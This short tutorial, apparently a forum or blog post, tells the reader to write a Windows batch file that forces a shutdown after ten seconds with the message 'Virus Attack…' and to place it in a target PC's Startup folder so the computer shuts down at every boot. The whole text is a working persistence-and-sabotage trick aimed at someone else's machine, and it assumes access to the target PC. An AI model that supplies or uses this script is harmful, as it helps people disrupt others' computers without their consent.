every boot shutdown

in notepad type :


          @ECHO OFF

          shutdown -s -t 10 -c “Virus Attack…”

          exit
          
          
save it as <whatever u want>.bat



for everyboot start u shoukd access the target pc and save it in Startups::
follow these steps

1. Start --> All Programs
2. Right Click on Startup --> Open
3. Paste the <whatever u want>.bat here.


